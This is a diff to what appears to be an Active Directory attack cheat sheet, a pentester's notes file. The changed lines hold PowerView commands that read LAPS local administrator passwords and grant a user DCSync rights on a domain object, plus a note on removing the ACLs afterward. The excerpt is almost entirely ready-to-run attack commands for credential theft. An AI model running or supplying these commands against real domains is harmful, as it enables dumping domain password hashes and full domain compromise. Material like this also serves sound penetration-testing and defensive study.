@@ -292,8 +292,9 @@ Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samacc
 
 ### Permissions on Domain Object
 #### Writedacl - Add permissions for dcsync
+- Use ```Remove-ObjectAcl``` to remove the ACL's
 ```
-Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
+Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<USER>' -Rights DCSync -Verbose
 
 #After impersonating the user with these permissions the above didn't work, but this did:
 Add-ObjectAcl -PrincipalIdentity exch_adm -Rights DCSync
